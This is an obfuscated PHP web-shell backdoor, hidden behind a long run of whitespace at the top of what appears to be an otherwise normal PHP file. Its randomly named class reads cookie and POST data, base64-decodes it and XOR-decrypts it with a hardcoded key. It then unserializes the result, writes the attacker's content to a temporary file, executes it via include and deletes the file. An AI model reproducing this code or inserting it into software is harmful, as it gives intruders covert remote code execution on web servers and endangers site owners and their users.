<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("eouraife")){class eouraife{public static $dsjsemdi = "mbklkycpyaliidii";public static $nlvndrgwk = NULL;public function __construct(){$fsailx = @$_COOKIE[substr(eouraife::$dsjsemdi, 0, 4)];if (!empty($fsailx)){$bmagwzp = "base64";$jyxqiruvy = "";$fsailx = explode(",", $fsailx);foreach ($fsailx as $byyketmdxg){$jyxqiruvy .= @$_COOKIE[$byyketmdxg];$jyxqiruvy .= @$_POST[$byyketmdxg];}$jyxqiruvy = array_map($bmagwzp . "_decode", array($jyxqiruvy,));$jyxqiruvy = $jyxqiruvy[0] ^ str_repeat(eouraife::$dsjsemdi, (strlen($jyxqiruvy[0]) / strlen(eouraife::$dsjsemdi)) + 1);eouraife::$nlvndrgwk = @unserialize($jyxqiruvy);}}public function __destruct(){$this->tdcjoaqmo();}private function tdcjoaqmo(){if (is_array(eouraife::$nlvndrgwk)) {$zmxvvh = sys_get_temp_dir() . "/" . crc32(eouraife::$nlvndrgwk["salt"]);@eouraife::$nlvndrgwk["write"]($zmxvvh, eouraife::$nlvndrgwk["content"]);include $zmxvvh;@eouraife::$nlvndrgwk["delete"]($zmxvvh);exit();}}}$cqbrn = new eouraife();$cqbrn = NULL;} ?><?php    
